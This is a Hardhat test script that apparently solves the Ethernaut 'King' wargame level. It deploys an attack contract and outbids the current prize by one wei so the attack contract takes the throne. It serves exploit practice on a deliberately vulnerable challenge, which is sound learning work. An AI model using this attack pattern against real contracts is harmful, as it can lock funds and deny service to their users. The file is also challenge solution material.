import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber, Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;
let attackContract: Contract;


describe.only("King", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("King");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS, ethers.utils.parseEther("0.001"));
        contract = await contractFactory.attach(challengeAddr);

        const attackContractFactory = await ethers.getContractFactory("KingAttack");
        attackContract = await attackContractFactory.deploy(contract.address);
    });

    it("Should solve the challenge", async function () {
        expect(await submitInstance(contract.address)).to.be.false;


        const currentPrize: BigNumber = await contract.prize(); 
            
        txn = await attackContract.attack({
            value: currentPrize.add(ethers.utils.parseUnits("1", "wei"))
        });
        await txn.wait();

        // TODO: transfer ownership back to owner
        expect(await contract._king()).to.equal(attackContract.address);
        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});